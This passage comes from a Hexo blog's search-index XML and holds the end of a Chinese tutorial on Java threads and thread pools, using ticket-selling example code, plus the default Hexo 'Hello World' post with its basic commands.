function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>ticket<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"票"</span><span class="token operator">+</span>ticket<span class="token punctuation">)</span><span class="token punctuation">;</span>            ticket<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"售罄了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test1</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//3.提供指定线程数量的线程池</span>            ExecutorService service<span class="token operator">=</span>Executors<span class="token punctuation">.</span><span class="token function">newFixedThreadPool</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//service.submit(new Mythread());//适用于Callable</span>    <span class="token comment" spellcheck="true">//4.执行指定的线程操作需要提供实现Runnable接口或Callable接口的类</span>            service<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Mythread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//适用于Runnable</span>            service<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Mythread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//关闭线程池</span>            service<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p>线程池的好处:</p><p><img src="https://i.loli.net/2020/07/20/bYuxqV2FJLMR3fw.png" alt=""><br>注:用survice.getClass()可以找到survice的实现类,可以发现是ThreadPoolExxcutor,然后上属的方法要通过强转才能用：<br>    ThreadPoolExxcutor survice1=(ThreadPoolExxcutor) survice;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 线程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 线程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/07/17/hello-world/"/>
      <url>/2020/07/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
